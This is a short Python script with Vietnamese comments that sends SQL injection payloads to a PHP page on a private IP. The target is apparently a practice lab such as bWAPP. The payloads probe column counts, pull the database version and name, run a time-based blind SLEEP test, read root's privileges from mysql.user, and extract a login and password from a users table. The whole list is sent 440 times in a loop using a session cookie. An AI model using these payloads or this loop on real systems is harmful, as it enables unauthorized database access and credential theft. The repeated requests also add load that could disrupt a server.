import requests
import time
import urllib.parse

# Danh sách các truy vấn SQL Injection bạn muốn thực hiện
queries = [
    "'order by 7 -- -",
    "'order by 8 -- -",
    "' union select 1,version(),3,4,database(),6,7 -- #",
    "uyen' AND (SELECT IF((SELECT LENGTH(user()) > 10), SLEEP(5), 0)) #",
    "uyen ' union select 1, version(),3,4,5,6,7 #",
    "uyen ' union select 1, (select group_concat(grant_priv) from mysql.user where user = 'root'), 3,4,5,6,7 #",
    "uyen%20'%20union%20select%201,2,3,4,5,6,7%20--%20",
    "uyen ' union select 1, (select login from users where id = 1), (select password from users where id = 1), 4,5,6,7 #"
]
# URL cơ bản của trang web
base_url = "http://192.168.10.10/sqli_10-2.php"

# Cookie của bạn (PHPSESSID và security_level)
cookies = {
    "PHPSESSID": "hsgaj3d1fdmnp9mhgq0h7410e7",
    "security_level": "0"
}

# Số lần request cần thực hiện
num_requests = 440

# Hàm gửi request cho từng query
def send_requests():
    for i in range(num_requests):
        for query in queries:
            # Mã hóa URL query để đảm bảo các ký tự đặc biệt như dấu cách, nháy đơn, v.v. được mã hóa đúng
            encoded_query = urllib.parse.quote(query)
            url = f"{base_url}?title={encoded_query}"
            
            try:
                # Thực hiện request với cookie
                response = requests.get(url, cookies=cookies)
                # In ra kết quả (status code)
                print(f"Request {i+1} thanh cong")
            except Exception as e:
                # In ra lỗi nếu có
                print(f" request {i+1} that bai")
            # Thêm delay nếu cần
            time.sleep(0.1)  # Thay đổi thời gian delay nếu muốn

# Bắt đầu thực hiện requests
send_requests()
